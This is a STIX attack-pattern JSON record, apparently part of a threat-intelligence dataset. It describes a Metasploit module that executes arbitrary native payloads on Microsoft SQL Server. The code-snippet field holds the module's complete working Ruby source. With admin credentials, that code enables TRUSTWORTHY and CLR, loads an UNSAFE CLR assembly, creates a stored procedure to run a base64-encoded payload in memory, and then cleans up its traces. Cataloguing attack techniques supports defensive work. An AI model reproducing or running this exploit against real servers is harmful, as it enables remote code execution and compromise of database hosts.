{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--891db582-1f65-4fb3-a762-96ddc829024b",
    "created": "2024-08-14T16:39:51.942006Z",
    "modified": "2024-08-14T16:39:51.94201Z",
    "name": "Microsoft SQL Server Clr Stored Procedure Payload Execution",
    "description": " This module executes an arbitrary native payload on a Microsoft SQL server by loading a custom SQL CLR Assembly into the target SQL installation, and calling it directly with a base64-encoded payload.  The module requires working credentials in order to connect directly to the MSSQL Server.  This method requires the user to have sufficient privileges to install a custom SQL CRL DLL, and invoke the custom stored procedure that comes with it.  This exploit does not leave any binaries on disk.  Tested on MS SQL Server versions: 2005, 2012, 2016 (all x64). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mssql/mssql_clr_payload.rb",
            "external_id": "mssql_clr_payload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://sekirkity.com/command-execution-in-sql-server-via-fileless-clr-based-custom-stored-procedure/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MSSQL\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SQL Server Clr Stored Procedure Payload Execution',\n      'Description'    => %q{\n        This module executes an arbitrary native payload on a Microsoft SQL\n        server by loading a custom SQL CLR Assembly into the target SQL\n        installation, and calling it directly with a base64-encoded payload.\n\n        The module requires working credentials in order to connect directly to the\n        MSSQL Server.\n\n        This method requires the user to have sufficient privileges to install a custom\n        SQL CRL DLL, and invoke the custom stored procedure that comes with it.\n\n        This exploit does not leave any binaries on disk.\n\n        Tested on MS SQL Server versions: 2005, 2012, 2016 (all x64).\n      },\n      'Author'         =>\n        [\n          'Lee Christensen',  # original idea/research\n          'Nathan Kirk',      # extra research/blog post\n          'OJ Reeves'         # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://sekirkity.com/command-execution-in-sql-server-via-fileless-clr-based-custom-stored-procedure/']\n        ],\n      'Platform'       => 'win',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Targets'        => [['Automatic', {}]],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '1999-01-01'\n    ))\n\n    register_options(\n      [\n        OptString.new('DATABASE', [true, 'The database to load the CLR Assembly into.', 'master'])\n      ])\n  end\n\n  def check\n    unless mssql_login_datastore(datastore['DATABASE'])\n      vprint_status('Invalid SQL Server credentials')\n      return Exploit::CheckCode::Detected\n    end\n\n    version = get_sql_version_string\n\n    unless version =~ /Server 20(05|08|12|14|16)/\n      vprint_status('Unsupported version of SQL Server')\n      return Exploit::CheckCode::Safe\n    end\n\n    if mssql_is_sysadmin\n      vprint_good \"User #{datastore['USERNAME']} is a sysadmin\"\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  ensure\n    disconnect\n  end\n\n  def get_sql_version_string\n    mssql_query(\"select @@version\", false)[:rows].first[0]\n  end\n\n  def get_sql_architecture(sql_version_string)\n    if sql_version_string =~ /(64-bit|x64)/i\n      ARCH_X64\n    else\n      ARCH_X86\n    end\n  end\n\n  def get_exploit_version(sql_version_string)\n    # keeping it simple at this point.\n    if sql_version_string =~ /Server (2005|2008|2012)/\n      'v3.5'\n    else\n      # assume 2014/2016 at this point.\n      'v4.0'\n    end\n  end\n\n  def set_trustworthy(on)\n    result = mssql_query(\"ALTER DATABASE [#{datastore['DATABASE']}] SET TRUSTWORTHY #{on ? 'ON' : 'OFF'}\", false)\n    unless result[:errors].empty?\n      result[:errors].each do |err|\n        vprint_error(err)\n      end\n      fail_with(Failure::Unknown, \"Failed to change Trustworthy setting\")\n    end\n  end\n\n  def is_trustworthy\n    # SQLi in MSF!! OMG!\n    result = mssql_query(\"SELECT CASE is_trustworthy_on WHEN 1 THEN 'ON' ELSE 'OFF' END FROM sys.databases WHERE name ='#{datastore['DATABASE']}'\", false)\n    result[:rows][0] == 'ON'\n  end\n\n  def enable_clr(enable)\n    query = %Q^\nEXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'clr enabled', #{enable ? 1 : 0};\nRECONFIGURE;\n    ^\n    result = mssql_query(query, false)\n    unless result[:errors].empty?\n      result[:errors].each do |err|\n        vprint_error(err)\n      end\n      fail_with(Failure::Unknown, \"Failed to change CLR setting\")\n    end\n  end\n\n  def is_clr_enabled\n    result = mssql_query(\"SELECT CASE value WHEN 1 THEN 'ON' ELSE 'OFF' END FROM sys.configurations WHERE name = 'clr enabled'\", false)\n    result[:rows][0] == 'ON'\n  end\n\n  def exploit\n    unless mssql_login_datastore(datastore['DATABASE'])\n      fail_with(Failure::BadConfig, 'Unable to login with the given credentials')\n    end\n\n    unless mssql_is_sysadmin\n      fail_with(Failure::BadConfig, 'Specified user lacks sufficient permissions')\n    end\n\n    # This module will only support 'thread' for EXITFUNC\n    # Bad things happen to SQL otherwise!\n    unless datastore['EXITFUNC'] == 'thread'\n      print_warning(\"Setting EXITFUNC to 'thread' so we don't kill SQL Server\")\n      datastore['EXITFUNC'] = 'thread'\n    end\n\n    sql_version = get_sql_version_string\n    vprint_status(\"Target SQL Version is:\\n#{sql_version}\")\n\n    sql_arch = get_sql_architecture(sql_version)\n    unless payload.arch.first == sql_arch\n      fail_with(Failure::BadConfig, \"Target SQL server arch is #{sql_arch}, payload architecture is #{payload.arch.first}\")\n    end\n\n    trustworthy = is_trustworthy\n    clr_enabled = is_clr_enabled\n\n    unless trustworthy\n      print_status('Database does not have TRUSTWORTHY setting on, enabling ...')\n      set_trustworthy(true)\n    end\n\n    unless clr_enabled\n      print_status('Database does not have CLR support enabled, enabling ...')\n      enable_clr(true)\n    end\n\n    exploit_version = get_exploit_version(sql_version)\n    print_status(\"Using version #{exploit_version} of the Payload Assembly\")\n    exploit_file_path = ::File.join(Msf::Config.install_root, 'data',\n                                    'SqlClrPayload', exploit_version, 'SqlClrPayload.dll')\n    vprint_status(\"Using #{exploit_file_path}\")\n\n    assembly = ::File.read(exploit_file_path)\n\n    # Convert the assembly to the required format for execution of the stored\n    # procedure to create the custom stored proc\n    hex_assembly = \"0x#{assembly.unpack('H*')[0]}\"\n    asm_name = Rex::Text.rand_text_alpha(rand(4) + 8)\n    query = \"CREATE ASSEMBLY [#{asm_name}] AUTHORIZATION [dbo] FROM #{hex_assembly} WITH PERMISSION_SET = UNSAFE\"\n\n    print_status('Adding custom payload assembly ...')\n    mssql_query(query, false)\n\n    proc_name = Rex::Text.rand_text_alpha(rand(4) + 8)\n    param_name = Rex::Text.rand_text_alpha(rand(4) + 8)\n    query = \"CREATE PROCEDURE [dbo].[#{proc_name}](@#{param_name} AS NVARCHAR(MAX)) AS EXTERNAL NAME [#{asm_name}].[StoredProcedures].[ExecuteB64Payload]\"\n\n    print_status('Exposing payload execution stored procedure ...')\n    mssql_query(query, false)\n\n    # Generate the base64 encoded payload\n    b64payload = Rex::Text.encode_base64(payload.encoded)\n    query = \"EXEC [dbo].[#{proc_name}] '#{b64payload}'\"\n    print_status('Executing the payload ...')\n    mssql_query(query, false)\n\n    print_status('Removing stored procedure ...')\n    mssql_query(\"DROP PROCEDURE [dbo].[#{proc_name}]\", false)\n\n    print_status('Removing assembly ...')\n    mssql_query(\"DROP ASSEMBLY [#{asm_name}]\", false)\n\n    unless clr_enabled\n      print_status('Restoring CLR setting ...')\n      enable_clr(false)\n    end\n\n    unless trustworthy\n      print_status('Restoring Trustworthy setting ...')\n      set_trustworthy(false)\n    end\n\n  ensure\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "1999-01-01",
    "x_mitre_platforms": [
        "win'"
    ]
}